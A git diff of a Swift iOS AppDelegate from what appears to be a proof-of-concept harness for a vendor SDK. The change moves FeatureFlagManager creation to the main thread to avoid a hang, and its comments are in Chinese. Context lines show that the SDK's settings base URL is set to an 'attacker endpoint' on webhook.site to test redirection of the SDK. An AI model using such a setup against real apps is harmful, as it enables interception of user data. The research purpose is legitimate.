@@ -77,12 +77,15 @@ final class AppDelegate: UIResponder, UIApplicationDelegate {
         window?.rootViewController = vc
         authDelegate.ui = vc
         window?.makeKeyAndVisible()
+        // FeatureFlagManager init 在后台线程会永久阻塞(sample 实证: 1089/1089 采样卡在
+        // FeatureFlagManager.swift:46) — 必须在主线程创建后传入
+        let ffm = FeatureFlagManager(hipaaAttachmentFlag: false)
         // build() 内部可能 sync-dispatch 回主队列 → 主线程调 build() 会死锁, 移到后台
-        DispatchQueue.global(qos: .default).async { self.startKit(vc: vc) }
+        DispatchQueue.global(qos: .default).async { self.startKit(vc: vc, ffm: ffm) }
         return true
     }
 
-    private func startKit(vc: DemoVC) {
+    private func startKit(vc: DemoVC, ffm: FeatureFlagManager) {
         // 攻击者端点 = webhook.site (CI 注入到 Info.plist; 公网可达, 绕开模拟器 loopback 与 ATS 变量)
         func plist(_ key: String) -> String { (Bundle.main.infoDictionary?[key] as? String) ?? "UNSET" }
         let attackerBase = plist("ZDK_SETTINGS_BASE_URL")
@@ -129,7 +132,7 @@ final class AppDelegate: UIResponder, UIApplicationDelegate {
         vc.log("④ builder.setup(authDelegate:) — 与真实商家 app 集成方式一致")
 
         let params = SettingsParameters(config: config,
-                                        featureFlagManager: FeatureFlagManager(hipaaAttachmentFlag: false))
+                                        featureFlagManager: ffm)
         let pocQueue = DispatchQueue(label: "poc.callback")   // SDK 回调队列 (不走 main, 避免与 build 竞争)
         let theKit = builder.build(with: params, callbackQueue: pocQueue)
         kit = theKit
